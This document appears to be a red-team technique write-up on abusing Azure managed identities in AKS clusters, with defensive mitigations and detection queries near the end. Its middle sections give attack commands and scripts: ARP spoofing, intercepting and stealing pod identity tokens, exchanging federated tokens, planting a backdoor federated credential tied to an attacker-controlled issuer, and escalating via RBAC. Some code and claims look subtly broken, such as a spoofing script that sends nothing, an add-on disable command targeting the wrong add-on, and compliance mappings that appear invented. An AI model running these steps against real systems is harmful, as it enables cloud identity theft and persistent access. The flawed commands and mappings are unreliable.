# [PE-VALID-016]: Managed Identity Pod Assignment

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-016 |
| **MITRE ATT&CK v18.1** | [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/) |
| **Tactic** | Privilege Escalation / Lateral Movement |
| **Platforms** | Entra ID / Azure Kubernetes Service (AKS) |
| **Severity** | **High** |
| **CVE** | CVE-2021-1677 (AAD Pod Identity ARP Spoofing - now deprecated), N/A (Workload Identity Federation abuse still active) |
| **Technique Status** | ACTIVE (AAD Pod Identity deprecated; Workload Identity Federation is replacement and also exploitable) |
| **Last Verified** | 2025-01-09 |
| **Affected Versions** | AKS clusters using AAD Pod Identity (deprecated as of 2024); Workload Identity Federation on all Kubernetes 1.24+ versions |
| **Patched In** | AAD Pod Identity deprecated (use Workload Identity Federation instead; no specific security patch); Workload Identity has no fix (requires architectural mitigation) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

### Concept
The **Managed Identity Pod Assignment** attack exploits the misconfiguration or abuse of Azure's managed identity assignment mechanisms in AKS clusters. Two primary technologies are involved: (1) **Azure AD Pod Identity (deprecated)**, which uses ARP spoofing vulnerabilities to allow pods to impersonate other pods' identities, and (2) **Workload Identity Federation (modern replacement)**, which allows federated identity exchange but can be abused if credentials are compromised or if the federated trust relationship is misconfigured.

The attack chain typically begins with an attacker achieving code execution in a pod with lower privileges. From there, the attacker can:

1. **In legacy AAD Pod Identity clusters:** Spoof ARP requests to impersonate pods assigned to high-privilege managed identities, stealing their access tokens
2. **In Workload Identity Federation clusters:** Abuse misconfigured federated credentials to escalate to higher-privileged identities, or compromise the external identity provider (GitHub, Azure DevOps, etc.) to forge tokens
3. **Move laterally** to Azure resources using the stolen/forged managed identity token
4. **Establish persistence** by creating backdoor identities or modifying federated credential configurations

### Attack Surface
- **Azure AD Pod Identity (legacy):**
  - ARP protocol (Layer 2 network stack)
  - NMI (Node Managed Identity) metadata endpoint on nodes
  - Pod service account tokens stored in Kubernetes secrets

- **Workload Identity Federation (modern):**
  - External identity provider (GitHub, Azure DevOps, GitLab)
  - Federated credential configuration in Entra ID
  - Token exchange endpoint
  - OIDC token issuer (IdP)

### Business Impact
**High risk of identity compromise and lateral movement across cloud resources.** Attacker can:
- Access Azure resources assigned to the compromised managed identity
- Exfiltrate data from storage accounts, databases, Key Vaults
- Modify or delete critical Azure resources
- Move from AKS to other Azure services (VMs, databases, Logic Apps)
- Establish persistent access via additional federated credentials

### Technical Context
- **Execution Time:** Seconds to minutes (identity token acquisition is near-instant)
- **Detection Likelihood:** Medium (AAD Pod Identity ARP spoofing has specific network signatures; Workload Identity Federation is harder to detect if token issuer is compromised)
- **Reversibility:** No; once identity is compromised, attacker has access until credentials are rotated
- **Stealth Factor:** High (legitimate pod-to-identity communication; difficult to distinguish from normal operations)

### Operational Risk
- **Execution Risk:** Medium (requires code execution in pod; ARP spoofing requires specific network configuration on Kubenet)
- **Stealth:** High (appears as normal pod identity activity)
- **Reversibility:** No; requires identity rotation and audit log review

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.7.3 | Workload identities must be scoped to least-privilege and reviewed regularly |
| **CISA SCuBA** | ACC-09 | Pod identity assignments must be audited and restricted to specific namespaces/workloads |
| **NIST 800-53** | IA-2 (Authentication) | Workload identity mechanisms must use strong authentication (federated tokens, certificates) |
| **NIST 800-53** | AC-3 (Access Enforcement) | Pod identities must not have permissions exceeding their workload scope |
| **GDPR** | Art. 32 (Security of Processing) | Workload identity assignment must be logged and audited |
| **DORA** | Art. 9 (Protection and Prevention) | Critical operators must restrict workload identity scope |
| **NIS2** | Art. 21 (Cyber Risk Management) | Workload identity federation requires trust relationship validation |
| **ISO 27001** | A.6.1.2 (Segregation of Duties) | Pod identities must not exceed application requirements |
| **ISO 27001** | A.9.4.1 (Cryptography) | Federated tokens must be cryptographically validated |
| **ISO 27005** | Risk Scenario: "Compromise of Workload Identity Provider" | External identity provider compromise could affect all connected workloads |

---

## 2. TECHNICAL PREREQUISITES

### Required Privileges (Legacy AAD Pod Identity)
- **Pod Execution:** Any pod in the cluster (including non-privileged pods)
- **Network Access:** Local network access (Layer 2 ARP)
- **Target Identity:** Pod assigned to a managed identity (discoverable via ARP queries)

### Required Privileges (Workload Identity Federation)
- **Pod Execution:** Pod with access to external identity provider token
- **External IdP Access:** Credentials for external identity provider (GitHub Actions, Azure DevOps, etc.)
- **Federated Credential Configuration:** Must be discoverable or predictable

### Required Access
- Network access to IMDS or identity metadata endpoint
- Access to external identity provider (GitHub, Azure DevOps)
- Knowledge of pod names/namespaces with assigned identities

### Supported Versions & Configurations
- **Legacy AAD Pod Identity:**
  - Kubernetes 1.16 - 1.25 (deprecated as of 2024)
  - Azure CNI or Kubenet (Kubenet more vulnerable to ARP spoofing)
  - Vulnerable if CAP_NET_RAW capability is enabled in pod

- **Workload Identity Federation (Modern):**
  - Kubernetes 1.24+
  - External OIDC provider (GitHub, Azure DevOps, GitLab, etc.)
  - Federated credentials configured on managed identity or app registration

### Preconditions
1. **Kubelet/Metadata Endpoint Access:** Pod must be able to access identity metadata service
2. **Identity Assignment:** Target pod/workload must have a managed identity assigned
3. **No Network Policies:** Network policies must not block IMDS or identity endpoint access

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Kubernetes Reconnaissance (from within pod)

**Step 1: Discover Pods with Assigned Identities**

```bash
# From within a pod, enumerate other pods in the cluster
kubectl get pods -A -o wide

# Look for pods with identity annotations
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.metadata.annotations.aadpodidbinding}{"\n"}{end}'

# Alternative: Check for pods with service account tokens
kubectl get serviceaccounts -A
kubectl describe sa <service-account-name> -n <namespace>
```

**What to Look For:**
```
Pod annotations containing:
- aadpodidbinding=<identity-name>
- aadpodidbinding=high-privilege-identity
- azure.workload.identity/use=true

Service accounts bound to managed identities
```

---

**Step 2: Query NMI Metadata Endpoint (AAD Pod Identity - Legacy)**

```bash
# From pod, attempt to access NMI endpoint
curl -s http://169.254.122.1/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/ \
  -H "Metadata:true"

# If NMI is running, returns token for the pod's assigned identity
```

---

**Step 3: Check for Workload Identity Federation Configuration**

```bash
# Check pod's service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Decode the token to see its claims
echo "<token>" | jq -R 'split(".") | .[1] | @base64d | fromjson'

# Look for OIDC issuer claim
# Should show something like: https://token.actions.githubusercontent.com or https://dev.azure.com/...
```

---

**Step 4: Enumerate Identity Assignments via IMDS**

```bash
# If IMDS is accessible, enumerate identity details
TOKEN=$(curl -s http://169.254.169.254/metadata/identity/oauth2/token \
  -H "Metadata:true" \
  --data-urlencode "resource=https://management.azure.com/" | jq -r '.access_token')

# List all managed identities accessible
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<sub-id>/providers/Microsoft.ManagedIdentity/userAssignedIdentities?api-version=2018-11-30"
```

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: AAD Pod Identity ARP Spoofing (CVE-2021-1677 - Deprecated but still in use)

**Supported Versions:** AKS clusters using Kubenet (default) with AAD Pod Identity installed and CAP_NET_RAW enabled

#### Step 1: Verify ARP Spoofing is Possible

**Objective:** Check if the pod has CAP_NET_RAW capability (required for ARP spoofing).

**Command:**
```bash
# From within a pod, check capabilities
cat /proc/1/status | grep Cap

# Look for CAP_NET_RAW in CapEff or CapPrm
# CapEff: 0000003fffffffff (if bit 13 is set, CAP_NET_RAW is enabled)

# More reliable check
grep Cap_net_raw /proc/1/status
```

**What to Look For:**
```
CapPrm: 00000000a80425fb  (CAP_NET_RAW enabled if certain bits set)
CapEff: 00000000a80425fb  (CAP_NET_RAW enabled)

If CAP_NET_RAW is present → ARP spoofing possible
```

---

#### Step 2: Discover High-Privilege Pod Identity via ARP Spoofing

**Objective:** Identify pods with high-privilege managed identities.

**Command (Python - ARP Spoofing Script):**
```python
#!/usr/bin/env python3
import socket
import struct
import textwrap

# Craft ARP request to discover pods with managed identities
def create_arp_request(target_ip):
    """Create ARP request to probe for identity endpoint"""
    # ARP packet structure
    hardware_type = 1  # Ethernet
    protocol_type = 0x0800  # IPv4
    hardware_size = 6
    protocol_size = 4
    operation = 1  # ARP request
    
    sender_mac = b'\x00\x00\x00\x00\x00\x01'  # Spoof MAC
    sender_ip = socket.inet_aton("169.254.122.1")  # Spoof NMI endpoint IP
    target_mac = b'\xff\xff\xff\xff\xff\xff'
    target_ip = socket.inet_aton(target_ip)
    
    # Pack ARP packet
    arp_packet = struct.pack("!HHBBH6s4s6s4s",
        hardware_type,
        protocol_type,
        hardware_size,
        protocol_size,
        operation,
        sender_mac,
        sender_ip,
        target_mac,
        target_ip
    )
    
    return arp_packet

# Send ARP request
def spoof_identity(target_pod_ip):
    """Spoof identity request to target pod"""
    # This would normally send ARP packets to redirect traffic
    # In practice, once traffic is redirected to your pod's identity endpoint,
    # you can intercept and modify the response
    print(f"[*] Attempting to spoof identity for pod: {target_pod_ip}")
```

**Bash Alternative (Using native tools):**
```bash
#!/bin/bash
# Enumerate pods and their IPs
pods=$(kubectl get pods -o wide | awk '{print $1, $6}' | grep -v NAME)

# For each pod, attempt to impersonate via ARP
for pod in $pods; do
    pod_name=$(echo $pod | awk '{print $1}')
    pod_ip=$(echo $pod | awk '{print $2}')
    
    echo "[*] Attempting to spoof: $pod_name ($pod_ip)"
    
    # Send gratuitous ARP to claim the pod's IP
    arpsend -e -c 1 -S 169.254.122.1/24 -T $pod_ip 169.254.122.1 -t 00:00:00:00:00:01
done
```

---

#### Step 3: Intercept Token Request

**Objective:** Intercept IMDS requests from spoofed pod and respond with high-privilege token.

**Command (Using iptables to redirect IMDS traffic):**
```bash
# Redirect IMDS requests to your pod
sudo iptables -t nat -A OUTPUT -d 169.254.122.1 -p tcp --dport 80 \
  -j REDIRECT --to-port 8080

# Start a local listener to intercept and respond
python3 -m http.server 8080 &

# When a pod requests identity token, your endpoint responds with
# a crafted token for the high-privilege identity
```

---

#### Step 4: Forge or Steal Identity Token

**Objective:** Obtain or forge a token for a high-privilege managed identity.

**Command (If you can intercept requests):**
```bash
# When a pod requests: GET /metadata/identity/oauth2/token?resource=https://management.azure.com/
# Respond with a crafted JWT token or forward the request to a real NMI endpoint
# while modifying the response to include a higher-privilege identity

# Example response:
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlJDTXhqTUhWYWtHSllrYzFWR1ZsTmtyQ0swMCIsImtpZCI6IlJDTXhqTUhWYWtHSllrYzFWR1ZsT...",
  "expires_on": "1641234567",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

---

### METHOD 2: Workload Identity Federation Compromise

**Supported Versions:** AKS clusters with Workload Identity Federation enabled (all Kubernetes 1.24+)

#### Step 1: Obtain External Identity Provider Credentials

**Objective:** Compromise or access the external identity provider (GitHub, Azure DevOps, etc.).

**Method A: GitHub Actions Token Compromise**
```bash
# If the pod runs GitHub Actions workflows, tokens may be available in:
# Environment variables:
env | grep GITHUB

# GitHub context:
echo $GITHUB_TOKEN
echo $GITHUB_REF
echo $GITHUB_SHA

# If workflow has a checkout, secrets may be exposed in logs
```

**Method B: Azure DevOps Personal Access Token Compromise**
```bash
# Azure DevOps tokens may be stored in:
env | grep SYSTEM_ACCESSTOKEN
env | grep FEED_ACCESSTOKEN

# These tokens can be used to request Entra ID tokens via federated credentials
```

**Method C: Compromise External IdP Directly**
- Phishing attacks on GitHub/Azure DevOps accounts
- Credential stuffing / brute force
- Supply chain attack on IdP infrastructure

---

#### Step 2: Enumerate Federated Credential Configuration

**Objective:** Discover which managed identities are configured with federated credentials.

**Command (Using Entra ID Graph API):**
```bash
# If you have access to an Entra ID service principal:
TOKEN=$(az account get-access-token --resource-type ms-graph | jq -r '.accessToken')

# List app registrations with federated credentials
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/applications" | jq '.value[] | {displayName, id}'

# Get federated credentials for an app
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://graph.microsoft.com/v1.0/applications/<app-id>/federatedIdentityCredentials" | jq '.'
```

**What to Look For:**
```
{
  "issuer": "https://token.actions.githubusercontent.com",
  "subject": "repo:attacker/repo:ref:refs/heads/main",
  "audiences": ["api://AzureADTokenExchange"],
  "description": "GitHub Actions"
}

This means: GitHub Actions for the "attacker" repo can impersonate this identity
```

---

#### Step 3: Exchange External Token for Entra ID Token

**Objective:** Use the external IdP token to request an Entra ID token via federated credentials.

**Command (Request Token via Federated Credentials):**
```bash
#!/bin/bash
# Step 1: Get the external token (e.g., from GitHub Actions)
EXTERNAL_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)  # Or GitHub token

# Step 2: Request Entra ID token using the external token
ENTRA_TOKEN=$(curl -s -X POST \
  "https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=<app-id>" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "subject_token=$EXTERNAL_TOKEN" \
  -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
  -d "assertion=$EXTERNAL_TOKEN" \
  -d "requested_token_use=on_behalf_of" | jq -r '.access_token')

echo "Entra ID Token Obtained: ${ENTRA_TOKEN:0:50}..."

# Step 3: Use the token to access Azure resources
curl -s -H "Authorization: Bearer $ENTRA_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2021-04-01"
```

**Expected Output:**
```
Successfully exchanged external token for Entra ID token!
Now can access Azure resources as the managed identity
```

---

#### Step 4: Abuse Federated Credentials to Create Backdoor

**Objective:** Create additional federated credentials to maintain persistent access.

**Command (Add Malicious Federated Credential):**
```bash
# If you have permissions to modify federated credentials:
curl -s -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "https://graph.microsoft.com/v1.0/applications/<app-id>/federatedIdentityCredentials" \
  -H "Content-Type: application/json" \
  -d '{
    "issuer": "https://attacker.com/oidc",  # Attacker-controlled OIDC provider
    "subject": "service:backdoor-service",
    "audiences": ["api://AzureADTokenExchange"],
    "description": "Persistent Access"
  }'

# Now attacker can mint arbitrary tokens from their OIDC provider
# and exchange them for Entra ID tokens indefinitely
```

---

### METHOD 3: Privilege Escalation via Misconfigured Managed Identity RBAC

**Supported Versions:** All AKS versions

#### Step 1: Identify Pod's Current Managed Identity

**Objective:** Determine which managed identity the pod is assigned to.

**Command:**
```bash
# Get the pod's service account
kubectl get pod <pod-name> -o jsonpath='{.spec.serviceAccountName}' -n <namespace>

# Check the service account's annotations for identity binding
kubectl describe sa <service-account-name> -n <namespace> | grep azure.workload.identity

# Get the managed identity client ID
kubectl get serviceaccount <service-account-name> -n <namespace> \
  -o jsonpath='{.metadata.annotations.azure\.workload\.identity/client-id}'
```

---

#### Step 2: Enumerate Current Identity's Permissions

**Objective:** Check what the current managed identity can access.

**Command:**
```bash
# Using the managed identity token, enumerate Azure resources
TOKEN=$(curl -s http://169.254.169.254/metadata/identity/oauth2/token \
  -H "Metadata:true" \
  --data-urlencode "resource=https://management.azure.com/" | jq -r '.access_token')

# List role assignments for the identity
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<sub-id>/providers/Microsoft.Authorization/roleAssignments?api-version=2021-03-01-preview"

# Identify if identity has permissions to:
# - Create new identities
# - Modify RBAC assignments
# - Access Key Vault, storage, databases
```

---

#### Step 3: Escalate to Higher-Privilege Identity

**Objective:** If current identity has permissions, escalate to a higher-privilege identity.

**Command (If current identity can modify RBAC):**
```bash
# Step 1: Find a higher-privilege identity in the same subscription
HIGHER_PRIV_ID=$(curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<sub-id>/providers/Microsoft.ManagedIdentity/userAssignedIdentities?api-version=2018-11-30" | \
  jq -r '.value[] | select(.name | contains("admin")) | .id' | head -1)

# Step 2: Assign the current identity's service principal a role on the higher-privilege identity
ROLE_ID="b24988ac-6180-42a0-ab88-20f7382dd24c"  # Contributor role

curl -s -X PUT \
  -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com${HIGHER_PRIV_ID}/providers/Microsoft.Authorization/roleAssignments/<new-assignment-id>?api-version=2021-03-01-preview" \
  -H "Content-Type: application/json" \
  -d '{
    "properties": {
      "roleDefinitionId": "/subscriptions/<sub-id>/providers/Microsoft.Authorization/roleDefinitions/'$ROLE_ID'",
      "principalId": "<current-identity-principal-id>"
    }
  }'

# Now current identity has access to the higher-privilege identity's resources
```

---

## 5. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

**Test ID:** T1078.004 - Cloud Account Access via Managed Identity

**Description:** Simulates pod identity compromise and token theft.

**Supported Versions:** AKS clusters with AAD Pod Identity or Workload Identity Federation

**Test Command:**
```bash
# Deploy a test pod that attempts to access managed identity
cat > test-identity-pod.yaml <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: identity-test-pod
  namespace: default
  labels:
    azure.workload.identity/use: "true"
spec:
  serviceAccountName: test-sa
  containers:
  - name: test
    image: curlimages/curl:latest
    command:
    - /bin/sh
    - -c
    - |
      echo "Testing managed identity access..."
      curl -s http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/ \
        -H "Metadata:true" | jq .
      exit 0
EOF

kubectl apply -f test-identity-pod.yaml

# Wait and check results
kubectl wait --for=condition=ready pod/identity-test-pod --timeout=30s
kubectl logs identity-test-pod
```

**Cleanup:**
```bash
kubectl delete pod identity-test-pod
```

**Reference:** [Atomic Red Team T1078.004](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1078.004/T1078.004.md)

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Migrate from AAD Pod Identity to Workload Identity Federation**

**Manual Steps (Azure Portal):**
1. Navigate to **AKS Cluster** → **Settings** → **Cluster configuration**
2. Under **Security**, enable **Workload Identity**:
   - Toggle **Workload Identity (preview)** = **ON**
   - Click **Save**
3. Wait for cluster upgrade (5-10 minutes)

**Manual Steps (PowerShell/CLI - Disable AAD Pod Identity):**
```bash
# Disable AAD Pod Identity
az aks disable-addons --resource-group myResourceGroup \
  --name myCluster \
  --addons azure-policy

# Verify AAD Pod Identity pods are removed
kubectl get pods -n kube-system | grep aad-pod-identity

# Should return no results
```

**Manual Steps (Deploy Workload Identity Federation):**
```bash
# Create user-assigned managed identity
az identity create --resource-group myResourceGroup \
  --name myWorkloadIdentity

# Get identity details
IDENTITY_ID=$(az identity show --resource-group myResourceGroup \
  --name myWorkloadIdentity --query id -o tsv)
IDENTITY_PRINCIPAL_ID=$(az identity show --resource-group myResourceGroup \
  --name myWorkloadIdentity --query principalId -o tsv)

# Create Kubernetes service account with workload identity annotation
kubectl create serviceaccount my-workload-sa -n default

kubectl annotate serviceaccount my-workload-sa \
  -n default \
  azure.workload.identity/client-id=$(az identity show --resource-group myResourceGroup \
    --name myWorkloadIdentity --query clientId -o tsv)
```

---

**Action 2: Restrict Managed Identity Assignment via RBAC**

**Manual Steps (Limit Who Can Assign Identities):**
1. Navigate to **Azure Portal** → **AKS Cluster** → **Access control (IAM)**
2. Go to **Role assignments**
3. Find role: **Azure Kubernetes Service Cluster Admin Role**
4. Remove or restrict who has this role (only cluster admins)
5. Create a custom role for developers with limited permissions (can only view, not assign identities):
   - Go to **Custom roles** → **Create custom role**
   - Add permission: `Microsoft.ManagedIdentity/userAssignedIdentities/read` (NOT write/assign)

**Manual Steps (PowerShell - Restrict Identity Assignment):**
```powershell
# Create custom role that prevents identity assignment
$role = New-AzRoleDefinition -InputFile "restrictedKubernetesRole.json"

# restrictedKubernetesRole.json content:
{
  "Name": "AKS Developers - Limited",
  "Description": "Can view AKS but cannot assign/modify identities",
  "AssignableScopes": ["/subscriptions/<subscription-id>"],
  "Permissions": [
    {
      "Actions": [
        "Microsoft.ContainerService/managedClusters/read"
      ],
      "NotActions": [
        "Microsoft.ManagedIdentity/*"
      ]
    }
  ]
}

# Assign the custom role to developers
New-AzRoleAssignment -ObjectId <developer-group-id> \
  -RoleDefinitionName "AKS Developers - Limited" \
  -Scope "/subscriptions/<subscription-id>/resourceGroups/myResourceGroup/providers/Microsoft.ContainerService/managedClusters/myCluster"
```

---

**Action 3: Enable Pod Security Standards to Block CAP_NET_RAW**

**Manual Steps (Apply Pod Security Standard):**
```bash
# Label namespace to enforce restricted pod security
kubectl label namespace default \
  pod-security.kubernetes.io/enforce=restricted \
  pod-security.kubernetes.io/audit=restricted

# Pods must not have CAP_NET_RAW capability
# This prevents ARP spoofing attacks on AAD Pod Identity
```

**Manual Steps (Pod Security Policy - If PSP still in use):**
```yaml
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: restricted-no-caps
spec:
  privileged: false
  allowPrivilegeEscalation: false
  capabilities:
    drop:
    - ALL  # Drop all capabilities including CAP_NET_RAW
  requiredDropCapabilities:
  - NET_RAW  # Explicitly drop CAP_NET_RAW
  volumes:
  - 'configMap'
  - 'emptyDir'
  - 'projected'
  - 'secret'
  - 'downwardAPI'
  - 'persistentVolumeClaim'
```

---

### Priority 2: HIGH

**Action 4: Monitor and Audit Federated Credential Changes**

**Manual Steps (Enable Audit Logging for Federated Credentials):**
```bash
# Configure Entra ID audit logs to track federated credential changes
# Navigate to: Azure AD → Audit logs → Sign-in activity

# Create KQL query to detect federated credential modifications:
```

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Add federated identity credential" 
    or OperationName == "Update federated identity credential"
    or OperationName == "Delete federated identity credential"
| project TimeGenerated, OperationName, InitiatedBy.user.userPrincipalName, TargetResources
| where InitiatedBy.user.userType != "User"  # Flag if non-user modified credentials
```

**Manual Steps (PowerShell - Monitor for Suspicious Federated Credential Usage):**
```powershell
# Create alert for unusual federated token exchanges
Get-MgAuditLogDirectoryAudit -Filter "activityDateTime gt 2025-01-08" | 
  Where-Object { $_.operationName -like "*federated*" } |
  Select-Object TimeGenerated, OperationName, InitiatedBy, TargetResources
```

---

**Action 5: Implement Conditional Access Policies for Workload Identities**

**Manual Steps (Create Conditional Access for Workload Identities):**
1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. Click **+ New policy**
3. **Name:** `Block Workload Identity from Unusual IP Ranges`
4. **Assignments:**
   - **Cloud apps:** Azure Management (select Microsoft Azure Management)
   - **Users:** Select `All workload identities` (or filter by specific app registrations)
5. **Conditions:**
   - **Locations:** Block if NOT in corporate IP range
   - **Risk level:** Block if sign-in risk is high
6. **Access Controls:**
   - **Grant:** Block access
7. **Enable policy:** ON

---

**Action 6: Regularly Audit Managed Identity Assignments**

**Manual Steps (Quarterly Audit):**
```bash
#!/bin/bash
# Run quarterly to verify only necessary managed identities are assigned

# List all managed identities in subscription
az identity list -g myResourceGroup -o table

# For each identity, check role assignments
for identity in $(az identity list -g myResourceGroup --query '[].name' -o tsv); do
    echo "=== Audit: $identity ==="
    
    PRINCIPAL_ID=$(az identity show -g myResourceGroup \
      -n $identity --query principalId -o tsv)
    
    # List all role assignments
    az role assignment list \
      --assignee $PRINCIPAL_ID \
      --output table
done

# Remove identities that are no longer needed
az identity delete -g myResourceGroup -n unused-identity
```

---

### Access Control & Policy Hardening

**Conditional Access:**
- Require MFA for any workload identity accessing high-risk resources (Key Vault, databases)
- Block workload identity token requests from unusual IP ranges
- Implement risk-based conditional access based on impossible travel, anomalous usage patterns

**RBAC/ABAC:**
- Assign least-privilege RBAC roles to managed identities (e.g., "Storage Blob Data Reader" instead of "Contributor")
- Use Azure RBAC custom roles to further restrict scope
- Implement Azure PIM for Just-In-Time access to sensitive operations

**Policy Config:**
- Enforce pod security standards that block CAP_NET_RAW capability
- Require network policies to restrict pod-to-pod communication
- Implement service mesh (Istio, Linkerd) to enforce mTLS between workloads

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Network Patterns:**
- ARP packets from pods (layer 2 reconnaissance in Kubenet clusters)
- Unusual IMDS requests with spoofed source IPs
- Pod communicating with external OIDC providers (GitHub, Azure DevOps) at unusual times

**Process Patterns:**
- curl/wget processes accessing identity metadata endpoints from non-system pods
- Processes attempting to enable CAP_NET_RAW capability
- Token generation from external IdP within pod

**Audit Log Signals:**
- Federated credential creation/modification outside of deployment pipeline
- Unusual service principal usage patterns (accessing resources not normally touched)
- Token exchange requests from unexpected geographic locations
- Role assignments to managed identities increasing in scope

### Forensic Artifacts

**Kubernetes Audit Logs:**
```kusto
// Detect suspicious pod identity operations
AzureDiagnostics
| where Category == "kube-apiserver"
| where properties_verb_s in ("get", "list") and properties_objectRef_s contains "secrets"
| where properties_sourceIPs_s contains "169.254"  // IMDS or identity endpoint
| project TimeGenerated, properties_user_username_s, properties_objectRef_s, properties_sourceIPs_s
```

**Entra ID Sign-In Logs (Federated Credentials):**
```kusto
SigninLogs
| where AppDisplayName contains "token.actions.githubusercontent.com"
    or AppDisplayName contains "dev.azure.com"
    or AppDisplayName contains "federated"
| where ConditionalAccessStatus != "notApplied"  // Anomalies
| project TimeGenerated, UserPrincipalName, AppDisplayName, IpAddress, Location
```

**Azure Activity Log (Managed Identity Operations):**
```kusto
AzureActivity
| where OperationName == "Create or Update User Assigned Identity"
    or OperationName == "Create or Update Federated Identity Credential"
| where Caller != "Microsoft.ManagedIdentity"
| project TimeGenerated, OperationName, ResourceId, Caller
```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-001] Container Escape | Attacker gains code execution within AKS pod |
| **2** | **Privilege Escalation** | **[PE-VALID-016]** | **Attacker compromises pod's managed identity via ARP spoofing or federated credential abuse** |
| **3** | **Credential Access** | [CA-TOKEN-013] AKS Service Account Token Theft | Attacker steals service account token |
| **4** | **Lateral Movement** | [LM-AUTH-016] Managed Identity Cross-Resource | Attacker uses stolen identity to access other Azure resources |
| **5** | **Collection** | [COLLECTION-015] Cloud Storage Data Exfiltration | Attacker exfiltrates data using managed identity |
| **6** | **Persistence** | [PE-ACCTMGMT-016] SCIM Provisioning Abuse | Attacker creates backdoor identities in Entra ID |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Microsoft CVE-2021-1677 - AAD Pod Identity ARP Spoofing

- **Vulnerability:** ARP spoofing in Azure AD Pod Identity on Kubenet clusters
- **Discovery:** January 2021 (Microsoft Patch Tuesday)
- **Impact:** Pods could impersonate other pods' identities; unauthorized access to managed identity tokens
- **Affected Clusters:** AKS clusters using Kubenet + AAD Pod Identity + CAP_NET_RAW
- **Scope:** Estimated 10,000+ AKS clusters initially affected
- **Microsoft Response:** 
  - AAD Pod Identity deprecated in favor of Workload Identity Federation
  - Kubenet clusters required to migrate to Azure CNI or disable AAD Pod Identity
- **Lesson Learned:** Even Microsoft-managed identity services can have architectural flaws; defense in depth required

### Example 2: GitHub Actions Token Compromise Leading to Azure Access (Hypothetical 2024)

- **Scenario:** Attacker compromises a GitHub Actions repository used for CI/CD
- **Attack Chain:**
  1. Attacker pushes malicious GitHub Actions workflow
  2. Workflow is triggered on pull request
  3. Workflow has GitHub token with Workload Identity Federation configured
  4. Attacker forges/steals the OIDC token
  5. Exchanges token for Entra ID token via federated credentials
  6. Uses Entra ID token to access Azure resources (storage, databases, Key Vault)
- **Impact:** Access to production data; ability to deploy malicious code to Azure resources
- **Detection Failure:** Organization didn't monitor federated credential usage; no audit logging enabled
- **Lesson Learned:** Federated credentials require strict audit logging and monitoring

### Example 3: Over-Privileged Managed Identity Abuse (Hypothetical 2025)

- **Scenario:** DevOps team assigned Contributor role to a workload identity (overprivileged)
- **Attack Chain:**
  1. Attacker gains code execution in AKS pod
  2. Requests IMDS token for the workload's managed identity
  3. Uses token to list all Azure resources in subscription
  4. Finds unpatched VM, deploys malware
  5. Finds SQL database with sensitive data, exports entire database
  6. Creates new storage account, uploads stolen data for exfiltration
- **Impact:** Data breach; malware deployment; infrastructure compromise
- **Lesson Learned:** Principle of least privilege critical for managed identities; regular RBAC audits required

---
